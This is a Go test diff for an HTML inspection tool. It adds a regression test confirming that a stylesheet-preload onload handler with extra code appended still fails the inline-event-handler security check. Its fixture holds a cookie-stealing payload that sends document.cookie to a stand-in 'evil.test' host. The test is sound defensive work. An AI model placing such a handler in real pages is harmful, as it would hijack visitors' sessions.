@@ -308,6 +308,41 @@ func TestInspectRenderedPageAllowsBenignStylesheetPreloadOnloadPattern(t *testin
 	}
 }
 
+// TestInspectRenderedPageFlagsPreloadOnloadThatEmbedsExtraCode is a
+// regression test for isBenignStylesheetPreloadOnload's allowlist: it must
+// require an exact match against the known-safe loadCSS polyfill idiom, not
+// merely contain it as a substring. An onload value that embeds the benign
+// pattern as a prefix but appends additional executable code after it (e.g.
+// via a trailing `;`) is exactly the kind of injected inline handler
+// security_inline_event_handlers exists to catch, and must still fail even
+// though it contains "this.rel='stylesheet'".
+func TestInspectRenderedPageFlagsPreloadOnloadThatEmbedsExtraCode(t *testing.T) {
+	siteRoot := t.TempDir()
+	writeRenderedHTML(t, siteRoot, "posts/preload-evil/index.html", `<!DOCTYPE html>
+<html lang="en">
+<head>
+<title>Preload</title>
+<meta name="description" content="Valid enough description.">
+<link rel="canonical" href="https://example.test/posts/preload-evil/">
+<link rel="preload" as="style" href="/css/site.css" onload="this.rel='stylesheet';fetch('https://evil.test/x?c='+document.cookie)">
+</head>
+<body><p>Malicious preload pattern.</p></body>
+</html>`)
+
+	idx := inspectRenderedPageIndex(t, siteRoot)
+	session, done := newInspectRenderedPageClient(t, siteRoot, idx)
+	defer done()
+
+	res := callTool(t, session, "inspect_rendered", map[string]any{"slug": "/posts/preload-evil/"})
+	if res.IsError {
+		t.Fatalf("inspect_rendered returned error: %v", res.Content[0].(*mcp.TextContent).Text)
+	}
+	checks := findChecks(t, decodeContent(t, res))
+	if got := checks["security_inline_event_handlers"]["status"]; got != "fail" {
+		t.Fatalf("security_inline_event_handlers status = %v, want fail — an onload value that merely embeds the benign pattern as a substring, with extra code appended, must not be exempted", got)
+	}
+}
+
 // TestInspectRenderedPageFlagsVBScriptURL is a regression test for a CodeQL
 // "Incomplete URL scheme check" finding (go/incomplete-url-scheme-check):
 // checkRenderedUnsafeURLs flagged javascript: and data: URLs but not
